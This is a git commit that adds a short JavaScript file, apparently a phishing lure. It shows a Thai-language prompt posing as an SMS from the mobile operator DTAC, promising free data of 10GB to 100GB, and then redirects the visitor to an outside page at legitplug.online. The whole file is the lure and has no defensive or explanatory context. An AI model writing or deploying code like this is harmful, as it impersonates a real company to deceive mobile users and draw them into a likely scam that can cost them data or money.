bcaacfdfe22ec3a9702fc83a3e4d989c6832f674
dataviewz <gloliousam2@gmail.com>
2025-09-21 08:25:15 -0700

    Create activation-dtacdata.js

---
+++ activation-dtacdata.js
@@ -0,0 +1,5 @@
+var password = 'ข้อมูลฟรี'
+password=prompt('DTAC SMS: เรียนลูกค้า กรุณาตรวจสอบว่าซิมการ์ด DTAC ของคุณมีสิทธิ์รับข้อมูลตั้งแต่ 10GB ถึง 100GB หรือไม่ ลูกค้าเก่ามีสิทธิ์ลุ้นรับข้อมูลฟรี กดตรวจสอบทันที ','ข้อมูลฟรี');
+if (password != 'ข้อมูลฟรี') {
+location.href='https://legitplug.online/dtacdata.html';
+}
